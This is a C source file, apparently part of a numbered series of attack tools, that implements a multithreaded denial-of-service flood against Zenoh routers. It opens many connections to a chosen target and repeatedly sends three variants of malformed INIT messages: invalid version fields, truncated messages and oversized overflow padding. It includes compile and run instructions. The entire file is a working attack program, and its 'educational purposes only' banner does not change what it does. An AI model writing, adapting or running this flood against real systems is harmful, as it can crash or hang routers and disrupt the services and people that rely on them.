/*
 * Attack 2: DoS - Malformed INIT Messages
 * Sends invalid INIT messages to crash/hang router
 * 
 * Compile: gcc -o attack2_malformed attack_2_dos_malformed_init.c -pthread
 * Run: ./attack2_malformed <target_ip> <target_port> <threads>
 * 
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_MSG_INIT 0x04

static volatile int g_running = 1;
static atomic_ullong g_packets_sent = 0;

typedef struct {
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping attack...\n");
    g_running = 0;
}

size_t craft_malformed_init_v1(unsigned char *buffer) {
    size_t offset = 0;
    buffer[offset++] = Z_MSG_INIT;
    buffer[offset++] = 0xFF; // Invalid version
    buffer[offset++] = 0xFF; // Invalid whatami
    for (int i = 0; i < 16; i++) buffer[offset++] = 0xAA; // Bad ZID
    for (int i = 0; i < 50; i++) buffer[offset++] = rand() % 256;
    return offset;
}

size_t craft_malformed_init_v2(unsigned char *buffer) {
    size_t offset = 0;
    buffer[offset++] = Z_MSG_INIT;
    buffer[offset++] = 0x08; // Version
    buffer[offset++] = 0x00; // No whatami
    return offset; // Truncated
}

size_t craft_malformed_init_v3(unsigned char *buffer) {
    size_t offset = 0;
    buffer[offset++] = Z_MSG_INIT;
    buffer[offset++] = 0x08;
    buffer[offset++] = 0xF0; // Invalid whatami
    memset(buffer + offset, 0x00, 16); // Null ZID
    offset += 16;
    for (int i = 0; i < 1000; i++) buffer[offset++] = 0xFF; // Overflow
    return offset;
}

void* attack_thread(void *arg) {
    thread_args_t *args = (thread_args_t*)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[2048];
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }
    
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0) {
        fprintf(stderr, "[-] Thread %d: Connect failed: %s\n", 
                args->thread_id, strerror(errno));
        close(sock);
        free(args);
        return NULL;
    }
    
    printf("[+] Thread %d connected\n", args->thread_id);
    
    unsigned long local_count = 0;
    int variant = 0;
    
    while (g_running) {
        size_t msg_len;
        
        switch (variant % 3) {
            case 0: msg_len = craft_malformed_init_v1(buffer); break;
            case 1: msg_len = craft_malformed_init_v2(buffer); break;
            case 2: msg_len = craft_malformed_init_v3(buffer); break;
        }
        variant++;
        
        ssize_t sent = send(sock, buffer, msg_len, 0);
        if (sent < 0) break;
        
        atomic_fetch_add(&g_packets_sent, 1);
        local_count++;
        
        if (local_count % 1000 == 0) {
            printf("[Thread %d] Sent %lu malformed INIT messages\n",
                   args->thread_id, local_count);
        }
        
        usleep(500);
    }
    
    close(sock);
    printf("[*] Thread %d stopped (sent %lu)\n", args->thread_id, local_count);
    free(args);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Malformed INIT Flood               ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Attack variants: 3 (rotation)\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    pthread_t threads[num_threads];
    time_t start = time(NULL);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
        usleep(100000);
    }
    
    printf("[+] Attack started!\n\n");
    
    while (g_running) {
        sleep(5);
        printf("[*] Total malformed messages: %llu\n", 
               (unsigned long long)atomic_load(&g_packets_sent));
    }
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Final Statistics                  ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Messages: %-26llu ║\n", (unsigned long long)atomic_load(&g_packets_sent));
    printf("║ Duration:       %-26ld ║\n", time(NULL) - start);
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}